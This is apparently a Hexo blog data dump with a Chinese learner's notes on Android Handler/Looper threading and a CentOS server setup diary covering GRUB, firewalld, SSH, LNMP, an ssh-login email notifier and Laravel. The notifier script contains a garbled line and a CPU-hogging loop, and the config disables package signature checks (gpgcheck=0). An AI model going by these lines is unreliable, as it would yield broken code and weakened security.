(TextView)findViewById(R.id.TextViewId);</span><br><span class=\"line\"></span><br><span class=\"line\">        handler = new MyHandler();</span><br><span class=\"line\"></span><br><span class=\"line\">        button.setOnClickListener(new View.<span class=\"function\"><span class=\"title\">OnClickListener</span></span>() &#123;</span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void onClick(View v) &#123;</span><br><span class=\"line\">                Thread thread = new NetWorkThread();</span><br><span class=\"line\">                thread.start();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class MyHandler extends Handler &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void handleMessage(Message msg)&#123;</span><br><span class=\"line\">            String s = (String)msg.obj;</span><br><span class=\"line\">            textView.setText(s);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class NetWorkThread extends Thread&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void <span class=\"function\"><span class=\"title\">run</span></span>()&#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Thread.sleep(2 * 1000);</span><br><span class=\"line\">            &#125; catch (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            String s = <span class=\"string\">\"your app is working!\"</span>;</span><br><span class=\"line\">            Message msg = handler.obtainMessage();</span><br><span class=\"line\">            msg.obj = s;</span><br><span class=\"line\">            handler.sendMessage(msg);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>这次运行成功了</strong></p>\n<h3 id=\"第三节课程\"><a href=\"#第三节课程\" class=\"headerlink\" title=\"第三节课程\"></a>第三节课程</h3><p><strong>记录之前有个小插曲，之前那个网站的视频到第二节课程就没有了，害得我到处找才找到</strong></p>\n<p><strong>今天主要内容</strong></p>\n<ol>\n<li>准备Looper对象</li>\n<li>在workerThread当中生成Handler对象</li>\n<li>在MainThread当中发送消息</li>\n</ol>\n<p><strong>先放代码再说问题</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.administrator.handler3;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.os.Handler;</span><br><span class=\"line\">import android.os.Looper;</span><br><span class=\"line\">import android.os.Message;</span><br><span class=\"line\">import android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.view.View;</span><br><span class=\"line\">import android.widget.Button;</span><br><span class=\"line\">import android.widget.TextView;</span><br><span class=\"line\"></span><br><span class=\"line\">public class MainActivity extends AppCompatActivity &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private Button button;</span><br><span class=\"line\">    private Handler handler;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        <span class=\"built_in\">set</span>ContentView(R.layout.activity_main);</span><br><span class=\"line\"></span><br><span class=\"line\">        button = (Button)findViewById(R.id.ButtonId);</span><br><span class=\"line\">        button.setOnClickListener(new View.<span class=\"function\"><span class=\"title\">OnClickListener</span></span>() &#123;</span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void onClick(View v) &#123;</span><br><span class=\"line\">                Message msg = handler.obtainMessage();</span><br><span class=\"line\">                String s = <span class=\"string\">\"your app is working!\"</span>;</span><br><span class=\"line\">                msg.obj = s;</span><br><span class=\"line\">                handler.sendMessage(msg);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        Thread thread = new MyThread();</span><br><span class=\"line\">        thread.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class MyThread extends Thread&#123;</span><br><span class=\"line\">        public void <span class=\"function\"><span class=\"title\">run</span></span>()&#123;</span><br><span class=\"line\">            Looper.prepare();</span><br><span class=\"line\">            handler = new <span class=\"function\"><span class=\"title\">Handler</span></span>()&#123;</span><br><span class=\"line\">                public void handleMessage(Message msg) &#123;</span><br><span class=\"line\">                    String s = (String)msg.obj;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;;</span><br><span class=\"line\">            Looper.loop();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>写代码时我将button监听器里面的内容设置成了启动线程，然后再button后面设置handler，结果不能运行，难道是因为那样运行到另外一个线程的时候发现handler还没有设置好。或许是吧，没时间想了，已经一点了，代码发布了就睡</strong></p>\n","excerpt":"<p><strong>这个需要学习三节课程，这是第一节，多的不说，直接放代码</strong></p>","more":"<h3 id=\"第一节课程\"><a href=\"#第一节课程\" class=\"headerlink\" title=\"第一节课程\"></a>第一节课程</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.administrator.handler;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.os.Handler;</span><br><span class=\"line\">import android.os.Message;</span><br><span class=\"line\">import android.provider.Settings;</span><br><span class=\"line\">import android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.view.View;</span><br><span class=\"line\">import android.widget.Button;</span><br><span class=\"line\"></span><br><span class=\"line\">public class MainActivity extends AppCompatActivity &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private Button button;</span><br><span class=\"line\">    private Handler handler;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        <span class=\"built_in\">set</span>ContentView(R.layout.activity_main);</span><br><span class=\"line\"></span><br><span class=\"line\">        button = (Button)findViewById(R.id.Button);</span><br><span class=\"line\">        button.setOnClickListener(new ButtonListener());</span><br><span class=\"line\">\t\thandler = new FirstHandler();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class ButtonListener implements View.OnClickListener&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void onClick(View view)&#123;</span><br><span class=\"line\">            Message message = handler.obtainMessage();</span><br><span class=\"line\">            message.what = 2;</span><br><span class=\"line\">            handler.sendMessage(message);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class FirstHandler extends Handler&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void handleMessage(Message message)&#123;</span><br><span class=\"line\">            int what = message.what;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"what = \"</span> + what);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>附上参考地址</strong><br><a href=\"https://developer.android.com/reference/android/os/Handler.html\">https://developer.android.com/reference/android/os/Handler.html</a></p>\n<p><strong>怎么说呢，上一节课程的代码其实我自己运行失败，主要是java基础还是没过关，不管怎样，先学完了再回头来看是怎么回事，今天来记录第二节课的学习笔记</strong></p>\n<h3 id=\"第二节课程\"><a href=\"#第二节课程\" class=\"headerlink\" title=\"第二节课程\"></a>第二节课程</h3><p><strong>主要内容</strong></p>\n<ol>\n<li>通过Handler实现线程间通信</li>\n<li>在主线程中实现Handler和handleMessage（）方法</li>\n<li>在Worker Thread当中通过Handler发送消息</li>\n</ol>\n<p><strong>今天学得什么我也不太清楚，大概是讲一个worker线程如何通过handler来改变main线程里面的东西，多说不如直接放代码</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.administrator.handler2;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.os.Handler;</span><br><span class=\"line\">import android.os.Message;</span><br><span class=\"line\">import android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.view.View;</span><br><span class=\"line\">import android.widget.Button;</span><br><span class=\"line\">import android.widget.TextView;</span><br><span class=\"line\"></span><br><span class=\"line\">public class MainActivity extends AppCompatActivity &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private Button button;</span><br><span class=\"line\">    private TextView textView;</span><br><span class=\"line\">    private Handler handler;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        <span class=\"built_in\">set</span>ContentView(R.layout.activity_main);</span><br><span class=\"line\"></span><br><span class=\"line\">        button = (Button)findViewById(R.id.ButtonId);</span><br><span class=\"line\">        textView = (TextView)findViewById(R.id.TextViewId);</span><br><span class=\"line\"></span><br><span class=\"line\">        handler = new MyHandler();</span><br><span class=\"line\"></span><br><span class=\"line\">        button.setOnClickListener(new View.<span class=\"function\"><span class=\"title\">OnClickListener</span></span>() &#123;</span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void onClick(View v) &#123;</span><br><span class=\"line\">                Thread thread = new NetWorkThread();</span><br><span class=\"line\">                thread.start();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class MyHandler extends Handler &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void handleMessage(Message msg)&#123;</span><br><span class=\"line\">            String s = (String)msg.obj;</span><br><span class=\"line\">            textView.setText(s);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class NetWorkThread extends Thread&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void <span class=\"function\"><span class=\"title\">run</span></span>()&#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Thread.sleep(2 * 1000);</span><br><span class=\"line\">            &#125; catch (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            String s = <span class=\"string\">\"your app is working!\"</span>;</span><br><span class=\"line\">            Message msg = handler.obtainMessage();</span><br><span class=\"line\">            msg.obj = s;</span><br><span class=\"line\">            handler.sendMessage(msg);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>这次运行成功了</strong></p>\n<h3 id=\"第三节课程\"><a href=\"#第三节课程\" class=\"headerlink\" title=\"第三节课程\"></a>第三节课程</h3><p><strong>记录之前有个小插曲，之前那个网站的视频到第二节课程就没有了，害得我到处找才找到</strong></p>\n<p><strong>今天主要内容</strong></p>\n<ol>\n<li>准备Looper对象</li>\n<li>在workerThread当中生成Handler对象</li>\n<li>在MainThread当中发送消息</li>\n</ol>\n<p><strong>先放代码再说问题</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.administrator.handler3;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.os.Handler;</span><br><span class=\"line\">import android.os.Looper;</span><br><span class=\"line\">import android.os.Message;</span><br><span class=\"line\">import android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.view.View;</span><br><span class=\"line\">import android.widget.Button;</span><br><span class=\"line\">import android.widget.TextView;</span><br><span class=\"line\"></span><br><span class=\"line\">public class MainActivity extends AppCompatActivity &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private Button button;</span><br><span class=\"line\">    private Handler handler;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        <span class=\"built_in\">set</span>ContentView(R.layout.activity_main);</span><br><span class=\"line\"></span><br><span class=\"line\">        button = (Button)findViewById(R.id.ButtonId);</span><br><span class=\"line\">        button.setOnClickListener(new View.<span class=\"function\"><span class=\"title\">OnClickListener</span></span>() &#123;</span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void onClick(View v) &#123;</span><br><span class=\"line\">                Message msg = handler.obtainMessage();</span><br><span class=\"line\">                String s = <span class=\"string\">\"your app is working!\"</span>;</span><br><span class=\"line\">                msg.obj = s;</span><br><span class=\"line\">                handler.sendMessage(msg);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        Thread thread = new MyThread();</span><br><span class=\"line\">        thread.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class MyThread extends Thread&#123;</span><br><span class=\"line\">        public void <span class=\"function\"><span class=\"title\">run</span></span>()&#123;</span><br><span class=\"line\">            Looper.prepare();</span><br><span class=\"line\">            handler = new <span class=\"function\"><span class=\"title\">Handler</span></span>()&#123;</span><br><span class=\"line\">                public void handleMessage(Message msg) &#123;</span><br><span class=\"line\">                    String s = (String)msg.obj;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;;</span><br><span class=\"line\">            Looper.loop();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>写代码时我将button监听器里面的内容设置成了启动线程，然后再button后面设置handler，结果不能运行，难道是因为那样运行到另外一个线程的时候发现handler还没有设置好。或许是吧，没时间想了，已经一点了，代码发布了就睡</strong></p>"},{"title":"CentOS","date":"2017-06-16T07:18:23.000Z","_content":"\n## 第一关：设置windows启动项\n**在安装双系统时，选择centos会默认没有windows的启动项，因此要添加windows的引导选项，过程如下：**\n\n- **开机进入CentOS系统**\n- **进入目录`/boot/grub2`，打开`grub.cfg`进行编辑**\n- **找到其中第70行，在指定位置添加内容 **\n<!--more-->\n**添加内容如下：**\n``` bash\n### END /etc/grub.d/00 header ###\nmenuentry 'Windows 10' {\n\tset root=(hd0,1)\n    chainloader +1\n}\n### BEGIN /etc/grub.d/10_linux ###\n```\n- **重启系统，引导菜单中新增了windows 10选项**\n\n## 第二关：防火墙\n**下载防火墙服务：**\n``` bash\n[root@localhost]$ yum install iptables-services\n```\n**查看防火墙状态：**\n``` bash\n[root@localhost]$ nmap localhost -p 0-10000\n```\n**启用ssh服务：**\n``` bash\n[root@localhost]$ yum install openssh-server\n[root@localhost]$ chkconfig sshd on\n[root@localhost]$ service sshd restart\n[root@localhost]$ /etc/init.d/sshd start\n```\n**在CentOS 7之前，系统默认的防火墙为`iptables`，因此上述为`iptables`版防火墙设置，下列为`firewall`版防火墙设置，`firewall`是centOS 7系统默认的防火墙，想必也是之后的趋势。**\n**查看`firewall`状态：**\n``` bash\n[root@localhost]$ systemctl status firewalld.service\n```\n**开启`firewall`服务（两者均可）**\n``` bash\n[root@localhost]$ systemctl start firewalld.service\n[root@localhost]$ service firewalld start\n```\n**开启`ssh`服务：**\n``` bash\n[root@localhost]$ yum install openssh-server\n```\n**更改默认`ssh`端口：**\n``` bash\n[root@localhost]$ vim /etc/ssh/sshd_config\n```\n**修改里面的端口为自己想要设置的端口，保存退出，由于系统默认不支持`ssh`使用22端口之外的端口，因此需要做修改：**\n``` bash\n[root@localhost]$ semanage port -a -t ssh_port_t -p tcp ××××\n[root@localhost]$ semanage port -l | grep ssh\n[root@localhost]$ systemctl restart sshd.service\n[root@localhost]$ firewall-cmd --permanent --zone=public --add-port=××××/tcp\n[root@localhost]$ firewall-cmd --reload\n[root@localhost]$ ss -tnlp | grep ssh\n```\n## 第三关：lnmp配置\n**安装`nginx`:**\n``` bash\n[root@localhost]$ yum install epel-release\n[root@localhost]$ yum -y install nginx\n[root@localhost]$ service nginx start\n```\n或者`/etc/yum.repo.d/nginx.repo`\n``` bash\n[nginx]\nbaseurl=http://nginx.org/packages/centos/$releasever/$basearch/\ngpgcheck=0\nenabled=1\n\n```\n**安装`php7.0`(CentOS 7.x):**\n``` bash\nrpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm\nrpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm\nyum install php70w php70w-opcache\nyum install php70w-fpm php70w-opcache\n```\n**安装php7.0不太容易，建议多在网上查**\n\n**设置`nginx`，更改root目录问题：**\n**之前将`nginx`的root目录改了过后出现了403问题，搞了好久还是没有一个很完整的解决方案，不过找到一个方案，但还是不太理解。将`nginx`中的配置文件的`user nginx` 改为自己的用户名，即更改过后root目录的所有者。**\n![](/images/nginxUser.png)\n**困惑点在于`nginx`默认的目录`/usr/share/nginx/html`的所有者为`root`但没有出现403**\n\n**安装`mysql`:**\n``` bash\n# yum install mysql\n# yum install mysql-devel\n# wget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm\n# rpm -ivh mysql-community-release-el7-5.noarch.rpm\n# yum install mysql-community-server\n# service mysqld restart\n```\n\n**配置问题**\n**1.配置`php.ini`: 只修改一行代码，通过`vim`查找`cgi.fix_pathinfo`，并将其修改为0,去注释.**\n**2.配置`www.conf`: 修改`listen`选项设置为`127.0.0.1:9000`; 设置`user`为`/home`下的一个用户,`group`也同样设置**\n**3.配置`nginx.conf`,将`user`改为`www.conf`里面的`user`相同，网站根目录必须在`nginx`的`user`下,具体配置如下**\n``` bash\nlocation ~ \\.php$ {\n        fastcgi_pass   127.0.0.1:9000;\n        fastcgi_index  index.php;\n        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n        include        fastcgi_params;\n    }\n```\n\n## 第四关：ssh登录邮件通知（后面有彩蛋哟）\n**游手好闲地折腾了几天，突发奇想，前几天租了一个vps，想随时检测有没有人通过ssh登录我的vps，如果有人登录，就发邮件通知，于是有了以下的折腾：**\n- **首先安装必备的软件`sendmail` 和`mailx`**\n- **通过`last`命令和`awk`结合获取ssh登录情况**\n- **最后写个python程序，让它一直跑着随时准备发邮件**\n- **将写好的程序运行命令写入/etc/rc.d/rc.local，让它开机运行**\n\n**那么命令如下：**\n``` bash\n[root@localhost]$ yum install sendmail sendmail-cf mailx\n[root@localhost]$ service sendmail start\n[root@localhost]$ last | awk '$1==\"root\"'\n```\n**接下来需要修改一个配置文件，让`sendmail`可以给整个英特网发送邮件，配置文件为`/etc/mail/sendmail.mc`，其中有一行**\n``` bash\nDAEMON_OPTIONS('port=smtp,Addr=127.0.0.1, Name=MTA-v6, Family=net6')dnl\n```\n**将127.0.0.1改为0.0.0.0，这样就可以给整个英特网发送邮件了**\n**python脚本如下**\n\n``` python\nimport os\n\ninst = \"last | awk \\'$1!=\\\"reboot\\\"\\'\"\nstr = os.popen(inst).read()\nssh_login = str.split(\"\\n\")\nlength = len(ssh_login)\n\nwhile True:\n    inst1 = \"last | awk \\'$1!=\\\"reboot\\\"\\' > ssh_login.txt\"\n    os.system(inst1)\n    str = os.popen(inst).read()\n    ssh_login = str.split(\"\\n  length1 = len(ssh_login)\n\n    if length1 > length:\n        login_name = ssh_login[0]\n        mail = \"echo %s | mail -s \\'$1!=\\\"reboot\\\"\\' ××××@qq.com\" % login_name\n        os.system(mail)\n        length = length1\n```\n\n**最重要的一点：qq邮箱发送成功一次过后vps的域名就会被拉黑，被认为是垃圾邮件，因此需要在邮箱管理界面设置域名白名单`localhost.localdomain`，然后大功告成，哈哈**\n\n**你以为这样就了事了？如果你将这个程序通过开机启动让它一直跑着，那么很开心的告诉你，你的机器cpu用不了多久就会被占满，所以，这个方法还是不行滴，这只是一种理想思路，想要处理的话可以选择指定时间运行一次或者每隔一段时间运行一次。接下来我去找个比较好的方式来实现这个功能，并实现每天发送当天的日志文件。**\n\n**我的vps跑了几个小时后的cpu受不了了，跑了不到两个小时，就被厂家限制了。**\n![](/images/cpu.png)\n\n## 第五关：python实现邮件发送\n**没时间了，直接贴代码**\n``` python\nfrom email import encoders\nfrom email.header import Header\nfrom email.mime.text import MIMEText\nfrom email.utils import parseaddr, formataddr\n\nimport smtplib\n\ndef _format_addr(s):\n    name, addr = parseaddr(s)\n    return formataddr((Header(name, 'utf-8').encode(), addr))\n\nfrom_addr = \"××××××××××@qq.com\"\npassword = \"××××××××××\"　　　# SMTP独立密码\nto_addr = \"××××××××××@qq.com\"\nsmtp_server = \"smtp.qq.com\"\n\nmsg = MIMEText('hello, send by Python...', 'plain', 'utf-8')\nmsg['From'] = _format_addr('fenlan <%s>' % from_addr)\nmsg['To'] = _format_addr('管理员 <%s>' % to_addr)\nmsg['Subject'] = Header('vps远程登录日志', 'utf-8').encode()\n\nserver = smtplib.SMTP_SSL(smtp_server, 465)\nserver.login(from_addr, password)\nserver.sendmail(from_addr, [to_addr], msg.as_string())\nserver.quit()\n\n```\n\n## 第六关：搭建laravel框架\n**首先安装`composer`(一个php工具，具体查看官网)**\n``` php\nphp -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\"\nphp -r \"if (hash_file('SHA384', 'composer-setup.php') === '669656bab3166a7aff8a7506b8cb2d1c292f042046c5a994c43155c0be6190fa0355160742ab2e1c88d40d5be660b410') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;\"\nphp composer-setup.php\nphp -r \"unlink('composer-setup.php');\"\n```\n**然后全局使用`composer`**\n``` bash\nmv composer.phar /usr/local/bin/composer\n```\n\n**接着安装`laravel`**\n``` bash\ncomposer create-project --prefer-dist laravel/laravel your_project_name\n```\n**进入项目目录更新`composer`**\n``` bash\ncomposer update\n```\n**在这里我遇到了一个问题，我搭建三次只遇见过一次**\n![](/images/laravel_problem.png)\n**根据提示进入里面说的网站上，跟着网站描述解决问题就ok**","source":"_posts/centos.md","raw":"---\ntitle: CentOS\ndate: 2017-06-16 15:18:23\ncategories: linux\ntags:\n  - centos\n  - firewall\n  - lnmp\n  - python\n  - laravel\n---\n\n## 第一关：设置windows启动项\n**在安装双系统时，选择centos会默认没有windows的启动项，因此要添加windows的引导选项，过程如下：**\n\n- **开机进入CentOS系统**\n- **进入目录`/boot/grub2`，打开`grub.cfg`进行编辑**\n- **找到其中第70行，在指定位置添加内容 **\n<!--more-->\n**添加内容如下：**\n``` bash\n### END /etc/grub.d/00 header ###\nmenuentry 'Windows 10' {\n\tset root=(hd0,1)\n    chainloader +1\n}\n### BEGIN /etc/grub.d/10_linux ###\n```\n- **重启系统，引导菜单中新增了windows 10选项**\n\n## 第二关：防火墙\n**下载防火墙服务：**\n``` bash\n[root@localhost]$ yum install iptables-services\n```\n**查看防火墙状态：**\n``` bash\n[root@localhost]$ nmap localhost -p 0-10000\n```\n**启用ssh服务：**\n``` bash\n[root@localhost]$ yum install openssh-server\n[root@localhost]$ chkconfig sshd on\n[root@localhost]$ service sshd restart\n[root@localhost]$ /etc/init.d/sshd start\n```\n**在CentOS 7之前，系统默认的防火墙为`iptables`，因此上述为`iptables`版防火墙设置，下列为`firewall`版防火墙设置，`firewall`是centOS 7系统默认的防火墙，想必也是之后的趋势。**\n**查看`firewall`状态：**\n``` bash\n[root@localhost]$ systemctl status firewalld.service\n```\n**开启`firewall`服务（两者均可）**\n``` bash\n[root@localhost]$ systemctl start firewalld.service\n[root@localhost]$ service firewalld start\n```\n**开启`ssh`服务：**\n``` bash\n[root@localhost]$ yum install openssh-server\n```\n**更改默认`ssh`端口：**\n``` bash\n[root@localhost]$ vim /etc/ssh/sshd_config\n```\n**修改里面的端口为自己想要设置的端口，保存退出，由于系统默认不支持`ssh`使用22端口之外的端口，因此需要做修改：**\n``` bash\n[root@localhost]$ semanage port -a -t ssh_port_t -p tcp ××××\n[root@localhost]$ semanage port -l | grep ssh\n[root@localhost]$ systemctl restart sshd.service\n[root@localhost]$ firewall-cmd --permanent --zone=public --add-port=××××/tcp\n[root@localhost]$ firewall-cmd --reload\n[root@localhost]$ ss -tnlp | grep ssh\n```\n## 第三关：lnmp配置\n**安装`nginx`:**\n``` bash\n[root@localhost]$ yum install epel-release\n[root@localhost]$ yum -y install nginx\n[root@localhost]$ 